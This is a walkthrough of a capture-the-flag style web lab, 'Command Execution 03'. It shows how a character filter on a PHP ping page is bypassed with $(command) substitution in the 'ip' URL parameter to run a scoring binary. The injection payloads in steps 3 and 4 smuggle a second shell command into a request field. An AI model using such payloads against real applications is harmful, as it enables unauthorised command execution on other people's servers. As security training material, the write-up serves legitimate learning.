Command Execution 03

In this challenge, the developer fixed the issue from the previous one and filter even more special characters.

However, the developer forgot that you can use $(command) to run a command.

*  The call to system in PHP only returns stdout, the code execution may succeed even if you don't see the result in the page. 

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

You can access this exercise using the following URL: http://ptc-11380d0d-59444e59.libcurl.so/.
You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-11380d0d-59444e59.libcurl.so/. 

Common Mistakes:

  *  Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

Steps: 
1)  Visit the given URL: http://ptc-11380d0d-59444e59.libcurl.so/. And it redirected to http://ptc-11380d0d-59444e59.libcurl.so/?ip=127.0.0.1.
2)  Let's ping the ip: http://ptc-e43a4550-5a90d674.libcurl.so/?ip= ping 127.0.0.1.
3)  Try `command` while injecting.So, let's put these command: 
    https://ptl-e43a4550-5a90d674.libcurl.so/?ip=`/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8`. It won't work now.
4)  We can use $(command) to run a command.
    http://ptc-e43a4550-5a90d674.libcurl.so/?ip= ping 127.0.0.1$(/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8)
5) Bravo!!  Congrats you have finished this exercise! 

        Happy Hacking!! :)
